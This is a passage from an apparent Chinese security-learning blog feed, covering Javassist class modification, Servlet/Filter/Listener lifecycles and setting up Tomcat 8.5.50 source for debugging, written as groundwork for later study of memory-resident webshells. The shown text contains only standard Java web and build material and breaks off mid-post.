class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<span class="hljs-comment">//分别是参数列表，要添加的CtClass</span><br>cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<span class="hljs-comment">//设置name=var1，也就是第一个参数</span><br>ctClass.addConstructor(cons);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071713061.png" alt="image-20240907171307942"></p><blockquote><p>无参构造去掉中间的参数即可</p></blockquote><h2 id="修改已有类"><a href="#修改已有类" class="headerlink" title="修改已有类"></a>修改已有类</h2><p>用ClassPool获取CtClass之后进行修改，我们对我们我们前面创建的Hello.class进行修改</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//对已有类进行修改</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.insertClassPath(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavassistLearn&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;changing\&quot;);&#125;&quot;</span>);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071745179.png" alt="image-20240907174508054"></p><p>可以看到成功修改</p><blockquote><p>这里添加类路径的时候要注意在包名的上一层，不然会找不到类，因为get的时候用完整包名会自动添加上路径进行搜索</p><p>比如上面的添加路径为：D:\CTF\Java\JavaCode\JavassistLearn，搜索时就是这样：D:\CTF\Java\JavaCode\JavassistLearn\Temp\Hello.class</p></blockquote><h1 id="一些特殊变量"><a href="#一些特殊变量" class="headerlink" title="一些特殊变量"></a>一些特殊变量</h1><p>就是我们前面使用的$1，$0那些</p><table><thead><tr><th>标识符</th><th>作用</th></tr></thead><tbody><tr><td>$0、$1、$2、 $3等</td><td>this和方法参数（1-N是方法参数的顺序）</td></tr><tr><td>$args</td><td>方法参数数组，类型为Object[]</td></tr><tr><td>$$</td><td>所有方法参数，例如：m($$)相当于m($1,$2,…)</td></tr><tr><td>$cflow(…)</td><td>control flow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，在强制转换表达式中使用。</td></tr><tr><td>$w</td><td>包装器类型，在强制转换表达式中使用。</td></tr><tr><td>$_</td><td>方法的返回值</td></tr><tr><td>$sig</td><td>类型为java.lang.Class的参数类型对象数组</td></tr><tr><td>$type</td><td>类型为java.lang.Class的返回值类型</td></tr><tr><td>$class</td><td>类型为java.lang.Class的正在修改的类</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：&lt;a href=&quot;https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>内存马前置学习</title>
    <link href="https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:05:36.000Z</published>
    <updated>2024-09-22T12:55:02.034Z</updated>
    
    <content type="html"><![CDATA[<p>学内存马前就要来学一学java web三大件的相关原理：Servlet、Filter、Listener</p><p>参考文章：<a href="https://www.cnblogs.com/jadite/p/16951328.html">https://www.cnblogs.com/jadite/p/16951328.html</a></p><h1 id="servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="servlet是什么"><a href="#Servlet是什么" class="headerlink" title="Servlet是什么"></a>Servlet是什么</h2><p>Servlet是JavaEE规范（接口）之一；<br>Servlet是运行在服务器(Web容器Tomcat等)上的一个 java 小程序，它用来接收客户端发送过来的请求进行处理，并响应数据给客户端。<br>Servlet及相对的对象，都由Tomcat创建，我们只是使用。</p><blockquote><p>Tomcat就是一个servlet容器</p></blockquote><p>Servlet需要完成3个任务：</p><ol><li>接收请求：将客户端发送过来的请求封装成ServletRequest对象（包含请求头、参数等各种信息）</li><li>处理请求：在service方法中接收参数，并且进行处理请求。</li><li>数据响应：请求处理完成后，通过转发（forward）或者重定向（redirect）到某个页面。</li></ol><p><strong>Servlet程序实现</strong></p><ol><li>实现Servlet接口，重新service方法</li><li>在web.xml或者用注解配置映射</li></ol><h2 id="servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h2><ol><li>执行 Servlet 构造器方法<br>第一步，在web.xml中的servlet中配置 load-on-startup 的值 ≥ 0 时，表示应用启动时就创建这个servlet。否则，第一次访问的时候调用。</li><li>执行 init 初始化方法<br>第二步，第一次访问的时候调用。</li><li>执行 service 方法<br>第三步，每次访问都会调用。</li><li>执行 destroy 销毁方法<br>第四步，在 web 工程停止的时候调用。</li></ol><h2 id="servletconfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h2><p>它是Servlet程序的配置信息类</p><p><strong>它的三大作用：</strong></p><ol><li>获取web.xml 中 Servlet 程序的别名 servlet-name 的值</li><li>获取web.xml 中 Servlet 程序的获取初始化参数 init-param</li><li>获取 ServletContext 对象</li></ol><p><strong>ServletConfig</strong></p><ol><li>每个web项目只有一个ServletContext对象，在web工程部署启动的时候创建，在工程停止的时候关闭。</li><li>ServletContext 对象是一个域对象（可以像Map一样存储数据的对象。域指的是作用域，这里是整个web工程）。</li></ol><p><strong>ServletContext 类的四个作用：</strong></p><ol><li>获取 web.xml 中配置的上下文参数 context-param</li><li>getContextPath()获取当前的工程路径，格式: &#x2F;工程路径</li><li>getRealPath()获取工程部署后在服务器硬盘上的绝对路径</li><li>像 Map 一样存取数据</li></ol><p><strong>HttpServletRequest和HttpServletResponse</strong></p><p>HttpServletResponse继承了ServletRequest，HttpServletResponse继承了ServletResponse，他们两个都是接口，所以我们在doGet或者doPost的时候传入的肯定是他们的实现类，而这个实现类是由tomcat创建的，封装了请求和响应的信息，到下面讲tomcat的时候再串起来细说。</p><h1 id="filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filter 是JavaEE规范（接口）之一；<br>Filter 过滤器它的作用是：拦截请求，过滤响应。</p><p><strong>常见应用场景：</strong><br>1、权限检查<br>2、日记操作<br>3、事务管理<br>……等等</p><p>所以Filter的顺序是在处理请求之前进行</p><p><strong>Filter使用</strong></p><p>1、实现 Filter 接口，实现过滤方法 doFilter()<br>2、到 web.xml或者注解中去配置 Filter 的拦截路径</p><h2 id="filter生命周期"><a href="#Filter生命周期" class="headerlink" title="Filter生命周期"></a>Filter生命周期</h2><ol><li>构造器方法</li><li>init 初始化方法<br>第 1，2 步，在 web 工程启动的时候执行（Filter 已经创建）</li><li>doFilter 过滤方法<br>第 3 步，每次拦截到请求，就会执行</li><li>destroy 销毁<br>第 4 步，停止 web 工程的时候，就会执行（停止 web 工程，也会销毁 Filter 过滤器）</li></ol><h2 id="filterconfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h2><p>Tomcat 每次创建 Filter 的时候，也会同时创建一个 FilterConfig 类，这里包含了 Filter 配置文件的配置信息。</p><p><strong>FilterConfig 类的作用是获取 filter 过滤器的配置内容：</strong></p><ol><li>获取 Filter 的名称 filter-name 的内容</li><li>获取在 Filter 中配置的 init-param 初始化参数</li><li>获取 ServletContext 对象</li></ol><h2 id="filterchain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h2><p>就是过滤器链，过滤器可能存在不止一个，它们执行的优先顺序由它们在web.xml中从上到下配置的<strong>filter-mapping</strong>顺序决定，与filter的配置顺序无关</p><p><strong>特点</strong></p><ol><li>所有filter和目标资源默认都执行在一个线程中。</li><li>多个filter共同执行的时候，它们使用的是同一个Request对象。</li></ol><p><strong>拦截路径匹配规则</strong></p><ul><li>精确匹配 &#x2F;target.jsp</li><li>目录匹配 &#x2F;admin&#x2F;*</li><li>后缀名匹配 *.html</li></ul><blockquote><p>Filter只关心路径是否匹配，不关心资源是否存在，毕竟最终不是由它来处理</p></blockquote><h1 id="listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><p>用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象，当被监视的对象发生情况时，立即采取相应的行动。本质是<strong>观察者模式</strong>。</p><p><strong>Servlet监听器</strong>：Servlet规范中定义的一种特殊类，它用于监听Web应用程序中的ServletContext，HttpSession 和HttpServletRequest等域对象的创建与销毁事件，以及监听这些域对象中的属性发生修改的事件。</p><h2 id="三类监听器"><a href="#三类监听器" class="headerlink" title="三类监听器"></a>三类监听器</h2><p><img src="https://cdn.clown2024.cn/202409080210968.png" alt="image-20240908021003987"></p><ul><li>域对象监听器</li><li>域对象的属性域监听器</li><li>Session域中数据的监听器</li></ul><h2 id="八大监听器"><a href="#八大监听器" class="headerlink" title="八大监听器"></a>八大监听器</h2><ol><li><p>ServletContextListener<br>监听ServletContext对象的创建与销毁</p><p>在SpringMVC中，有个<strong>ContextLoaderListener</strong>，这个监听器就实现了ServletContextListener接口，表示对ServletContext对象本身的生命周期进行监控</p></li><li><p>HttpSessionListener</p><p>监听HttpSession对象的创建与销毁</p></li><li><p>ServletRequestListener</p><p>监听ServletRequest对象的创建与销毁</p></li><li><p>ServletContextAttributeListener</p><p>监听ServletContext中属性的创建、修改和销毁</p></li><li><p>HttpSessionAttributeListener</p><p>监听HttpSession中属性的创建、修改和销毁</p></li><li><p>ServletRequestAttributeListener</p><p>监听ServletRequest中属性的创建、修改和销毁</p></li><li><p>HttpSessionBindingListener</p><p>监听某个对象在Session域中的创建与移除</p></li><li><p>HttpSessionActivationListener</p><p>监听某个对象在Session中的序列化与反序列化。</p></li></ol><h2 id="监听器使用"><a href="#监听器使用" class="headerlink" title="监听器使用"></a>监听器使用</h2><ol><li><p>实现八大监听器中的一种，重写对应方法</p></li><li><p>同样去web.xml或者用注解配置</p><p>web.xml配置</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>com.demo.listener.HelloListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>推荐一个视频讲得非常好(我个人觉得)，把很多东西串起来了而且深入到源码层面，理解得更加清晰</p><p>视频链接：<a href="https://www.bilibili.com/video/BV19E411j7cD/?spm_id_from=333.999.0.0&vd_source=f056182291458f597ae69cee19ecf116">【图灵学院】终于有人把tomcat讲清楚了！Tomcat底层原理深度解析_哔哩哔哩_bilibili</a></p><p><strong>Tomcat简单架构图</strong></p><p><img src="https://cdn.clown2024.cn/202409122011964.png" alt="image-20240912201120883"></p><p>找到的另一张架构图</p><p><img src="https://cdn.clown2024.cn/202409142315429.png" alt="image-20240914231538327"></p><h2 id="tomcat源码启动"><a href="#Tomcat源码启动" class="headerlink" title="Tomcat源码启动"></a>Tomcat源码启动</h2><p>这里就搞了我好久了，看了很多文章才搞定，最后参考的是下面两篇文章</p><p><a href="https://blog.csdn.net/zhoutaoping1992/article/details/104751705">记一次tomcat源码启动控制台中文乱码问题调试过程_org.apache.catalina.startup.versionloggerlistener.-CSDN博客</a></p><p><a href="https://www.cnblogs.com/huim/p/16614196.html">idea调试tomcat源码 - huim - 博客园 (cnblogs.com)</a></p><p><strong>源码下载</strong></p><p>首先找到源码包下载，这里用的tomcat-8.5.50的版本</p><p>历史版本列表：<a href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a><br>源码文件夹：<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/</a></p><p>然后在源码根目录下添加如下pom.xml文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sourceDirectory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">sourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testSourceDirectory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">testSourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testResources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">testResource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">testResource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">testResources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.easymock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easymock<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.xml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jaxrpc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.eclipse.jdt.core.compiler<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ecj<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092054244.png" alt="image-20240909205433170"></p><p>然后配置一下合适的jdk版本，这个就不多说了</p><p>下一步配置configuration，添加一个application</p><p><img src="https://cdn.clown2024.cn/202409092056897.png" alt="image-20240909205609843"></p><p>添加入口类org.apache.catalina.startup.Bootstrap</p><blockquote><p>在此之前需要reload一下maven项目，不然会不识别相关的java源码</p></blockquote><p><img src="https://cdn.clown2024.cn/202409092057339.png" alt="image-20240909205701250"></p><p>然后我们就可以启动了</p><p><strong>错误一</strong></p><p>这时候会遇到第一个错误，无法解析jsp，也就是访问localhost:8080不是tomcat的首页而是返回了500，这时候需要去添加一个JSP解析器，需要我们去修改源码</p><p>找到org.apache.catalina.startup.ContextConfig类，在ConfigureStart方法下添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">context.addServletContainerInitializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperInitializer</span>(), <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092101636.png" alt="image-20240909210146552"></p><p><strong>错误二</strong></p><p>这时候页面访问是正常的，但是控制台的日志是乱码的，如下</p><p><img src="https://cdn.clown2024.cn/202409092047988.png" alt="image-20240909204702883"></p><p>这是因为在java中, 读取文件的默认格式是iso8859-1, 而我们中文存储的时候一般是UTF-8. 所以导致读出来的是乱码。</p><p>文章中有两种方式修改乱码，我这里采用修改源码的方式去修改，就是找到读取文件的地方，转化一下编码方式，这里直接copy一下解决方案，可以自己通过调试去找到对应位置(我比较懒就不调了)</p><ul><li><p>org.apache.tomcat.util.res.StringManager类中的getString(final String key, final Object… args)方法；添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        value =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(value.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092105213.png" alt="image-20240909210550131"></p></li><li><p>org.apache.jasper.compiler.Localizer类的getMessage(String errCode)方法；添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        errMsg =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(errMsg.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>        e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092107159.png" alt="image-20240909210715069"></p></li></ul><p>到这里就解决完我遇到的所有问题，可以快乐调试了🫡</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>我们首先要知道Tomcat是一个servlet容器。</p><h3 id="httpservletrequest和httpservletresponse"><a href="#HttpServletRequest和HttpServletResponse" class="headerlink" title="HttpServletRequest和HttpServletResponse"></a>HttpServletRequest和HttpServletResponse</h3><p><img src="https://cdn.clown2024.cn/202409112032626.png" alt="image-20240911203158516"></p><p><img src="https://cdn.clown2024.cn/202409112033582.png" alt="image-20240911203322536"></p><p>我们知道HttpServletRequest和HttpServletResponse是一个接口，我们正常写一个servlet如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servlettest;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <br>        <span class="hljs-comment">// Hello</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;destory &quot;</span>+message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们调用这两个接口的方法就需要一个实现类，那这个实现类是谁创建呢，就由我们的tomcat来创建</p><p>去看tomcat的源码就可以知道RequestFacade就是其中一个实现类</p><p><img src="https://cdn.clown2024.cn/202409112036033.png" alt="image-20240911203618945"></p><p>不过这个类只是一个类似门面的类，里面真正的实现是Request类，里面的方法更复杂，该类也是实现了Servlet规范的类</p><p><img src="https://cdn.clown2024.cn/202409121050908.png" alt="image-20240912105042783"></p><p>这里就是给下面的分析当个引子，引发一下思考。</p><h3 id="jar包和war包"><a href="#jar包和war包" class="headerlink" title="jar包和war包"></a>jar包和war包</h3><p>我们在tomcat部署项目的时候，可以将web项目打包成war包然后部署到tomcat的webapps目录下</p><p><img src="https://cdn.clown2024.cn/202409121053527.png" alt="image-20240912105338467"></p><p>启动tomcat的时候他就会自动解压，里面的内容如下：</p><p><img src="https://cdn.clown2024.cn/202409121054829.png" alt="image-20240912105432764"></p><p>我们也可以在server.xml里面设置是否进行自动解压</p><p><img src="https://cdn.clown2024.cn/202409121055233.png" alt="image-20240912105551171"></p><p>那么jar包呢？</p><p>其实jar的内容和war包解压出来是没有什么区别的，jar和war包主要是tomcat启动时用来区分这是一个依赖还是一个应用</p><h3 id="tomcat应用的几种部署方式"><a href="#tomcat应用的几种部署方式" class="headerlink" title="tomcat应用的几种部署方式"></a>tomcat应用的几种部署方式</h3><p>部署的几种方式可以在<strong>HostConfig#deployApps</strong>中看到</p><p><img src="https://cdn.clown2024.cn/202409121100464.png" 